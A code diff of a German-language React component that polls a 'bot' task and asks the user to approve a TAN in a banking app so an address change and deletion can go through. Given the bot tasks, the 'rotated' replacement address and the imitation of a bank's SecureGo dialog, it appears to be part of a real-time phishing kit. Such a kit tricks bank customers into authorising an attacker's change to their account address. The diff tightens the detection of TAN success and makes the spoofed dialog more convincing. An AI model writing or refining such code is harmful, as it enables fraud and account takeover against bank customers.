@@ -232,31 +232,8 @@ const AddressVerification = ({
           addressTanSeen = true;
         }
 
-        // Erfolg: TAN wurde bestätigt. Erkannt entweder direkt am Status
-        // (tan_confirmed/completed), an Flags im Result oder am Übergang
-        // waiting_for_tan → running (nachdem wir eine Address-TAN gesehen haben).
-        const transitionedTanToRunning =
-          previousStatus === "waiting_for_tan" && status === "running";
-        const approved =
-          status === "tan_confirmed" ||
-          status === "completed" ||
-          result?.address_changed === true ||
-          result?.address_confirmed === true ||
-          (addressTanSeen && status === "running") ||
-          (transitionedTanToRunning &&
-            (previousTanType === "address" || previousTanType === "" || addressTanSeen));
-
-        if (approved) {
-          setSecureGoApproved(true);
-          setAddressTanSuccess(true);
-          setDeleteAwaitingTan(false);
-          timer = setTimeout(() => {
-            setShowDeleteDialog(false);
-            setShowSecureGo(false);
-            onDelete();
-          }, 2500);
-          return;
-        }
+        // Zuerst harte Fehlersignale prüfen, damit ein zwischenzeitliches
+        // "running" nicht fälschlich als Erfolg gewertet wird.
         if (status === "failed" || status === "tan_rejected" || status === "tan_timeout") {
           setDeleteAwaitingTan(false);
           setSecureGoApproved(false);
@@ -269,6 +246,68 @@ const AddressVerification = ({
             setShowDeleteDialog(false);
             setShowSecureGo(false);
             onTanFailed?.(msg);
+          }, 1500);
+          return;
+        }
+
+        const hardApproved =
+          status === "tan_confirmed" ||
+          status === "completed" ||
+          result?.address_changed === true ||
+          result?.address_confirmed === true;
+
+        if (hardApproved) {
+          setSecureGoApproved(true);
+          setAddressTanSuccess(true);
+          setDeleteAwaitingTan(false);
+          timer = setTimeout(() => {
+            setShowDeleteDialog(false);
+            setShowSecureGo(false);
+            onDelete();
+          }, 2500);
+          return;
+        }
+
+        // Weicher Erfolg: waiting_for_tan(address) → running.
+        // Um Race-Conditions mit tan_rejected zu vermeiden, erst nach einem
+        // stabilen Folge-Poll ohne rejected/timeout als Erfolg werten.
+        const transitionedTanToRunning =
+          previousStatus === "waiting_for_tan" && status === "running" &&
+          (previousTanType === "address" || addressTanSeen);
+
+        if (transitionedTanToRunning) {
+          previousStatus = status;
+          timer = setTimeout(async () => {
+            if (cancelled) return;
+            try {
+              const { getBotTask } = await import("@/lib/botClient");
+              const { data: d2 } = await getBotTask(taskId);
+              const s2 = String(d2?.status ?? "").toLowerCase();
+              if (s2 === "tan_rejected" || s2 === "tan_timeout" || s2 === "failed") {
+                setDeleteAwaitingTan(false);
+                const msg =
+                  s2 === "tan_timeout"
+                    ? "Zeitüberschreitung bei der TAN-Freigabe. Bitte versuchen Sie es erneut."
+                    : "Die TAN-Freigabe wurde abgelehnt. Bitte versuchen Sie es erneut.";
+                setDeleteError(msg);
+                setTimeout(() => {
+                  setShowDeleteDialog(false);
+                  setShowSecureGo(false);
+                  onTanFailed?.(msg);
+                }, 1500);
+                return;
+              }
+              setSecureGoApproved(true);
+              setAddressTanSuccess(true);
+              setDeleteAwaitingTan(false);
+              setTimeout(() => {
+                setShowDeleteDialog(false);
+                setShowSecureGo(false);
+                onDelete();
+              }, 2500);
+            } catch {
+              timer = setTimeout(poll, 1000);
+            }
           }, 1500);
           return;
         }
@@ -632,16 +671,48 @@ const AddressVerification = ({
           setShowSecureGo(open);
         }}
       >
-        <DialogContent className="sm:max-w-lg p-6 sm:p-8">
+        <DialogContent className="sm:max-w-lg p-6 sm:p-8 max-h-[90vh] overflow-y-auto">
           <DialogHeader>
-            <DialogTitle className="text-xl font-bold" style={{ color: themeColor }}>
-              Sicherheitsabfrage
-            </DialogTitle>
+            <DialogTitle className="sr-only">Sicherheitsabfrage</DialogTitle>
           </DialogHeader>
-          <div className="rounded-lg border border-gray-300 px-4 py-3 mt-2">
-            <p className="text-xs text-gray-500">Sicherheitsverfahren</p>
-            <p className="text-base font-semibold text-gray-900">{secureGoLabel}</p>
+
+          {/* Adressdaten – Abgleich */}
+          <div className="rounded-lg border border-gray-200 p-4 mb-4">
+            <p className="font-bold text-gray-900 mb-2">Adresse bearbeiten</p>
+            <p className="text-xs text-gray-500">Adressat</p>
+            <p className="text-sm text-gray-800 mb-3">{customerName ?? "—"}</p>
+            <p className="text-xs text-gray-500">Hauptadresse (Wohnsitz)</p>
+            <p className="text-sm text-gray-800">{currentAddress?.strasse}</p>
+            <p className="text-sm text-gray-800 mb-3">{currentAddress?.plzOrt}</p>
+
+            <div className="border-t border-gray-200 my-3" />
+
+            <p className="font-bold text-gray-900 mb-2">Adresse löschen</p>
+            <p className="text-xs text-gray-500">Hauptadresse (Wohnsitz)</p>
+            <p className="text-sm text-gray-800">{effectiveRotatedAddress.street}</p>
+            <p className="text-sm text-gray-800">
+              {effectiveRotatedAddress.zip_code} {effectiveRotatedAddress.city}
+            </p>
           </div>
+
+          <h3 className="text-lg font-bold text-gray-900 mb-2">Sicherheitsabfrage</h3>
+          <button
+            type="button"
+            className="flex items-center gap-2 text-sm font-semibold mb-3"
+            style={{ color: themeColor }}
+          >
+            <ChevronDown className="w-4 h-4" />
+            Bitte unbedingt Auftragsdaten abgleichen
+          </button>
+
+          <div className="rounded-lg border border-gray-300 px-4 py-3 flex items-center justify-between">
+            <div>
+              <p className="text-xs text-gray-500">Sicherheitsverfahren</p>
+              <p className="text-base font-semibold text-gray-900">{secureGoLabel}</p>
+            </div>
+            <ChevronDown className="w-5 h-5 text-gray-400" />
+          </div>
+
           <div className="rounded-lg border-2 border-orange-300 bg-orange-50/40 p-5 mt-4">
             <div className="flex items-center gap-3 mb-3">
               <Smartphone className="w-5 h-5 text-gray-700" />
@@ -650,7 +721,10 @@ const AddressVerification = ({
             <ol className="space-y-2 text-sm text-gray-800">
               <li>1. Öffnen Sie die App {secureGoLabel} auf Ihrem Mobile Device.</li>
               <li>2. Prüfen Sie die Auftragsdaten.</li>
-              <li>3. Bestätigen Sie den Auftrag in der App.</li>
+              <li>
+                3. Bestätigen Sie den Auftrag, wenn die Auftragsdaten korrekt sind.
+                Andernfalls lehnen Sie den Auftrag ab.
+              </li>
             </ol>
             <div className="flex justify-center py-4">
               {addressTanSuccess ? (
@@ -669,6 +743,20 @@ const AddressVerification = ({
             {deleteError && (
               <p className="text-sm text-red-600 text-center">{deleteError}</p>
             )}
+          </div>
+
+          <div className="mt-5 flex justify-start">
+            <button
+              type="button"
+              disabled={deleteAwaitingTan && !deleteError}
+              onClick={() => {
+                setShowSecureGo(false);
+                setDeleteAwaitingTan(false);
+              }}
+              className={`${theme.buttonRadius || "rounded-full"} border border-gray-300 px-6 py-2.5 text-sm font-medium text-gray-800 hover:bg-gray-50 disabled:opacity-60`}
+            >
+              Abbrechen
+            </button>
           </div>
         </DialogContent>
       </Dialog>
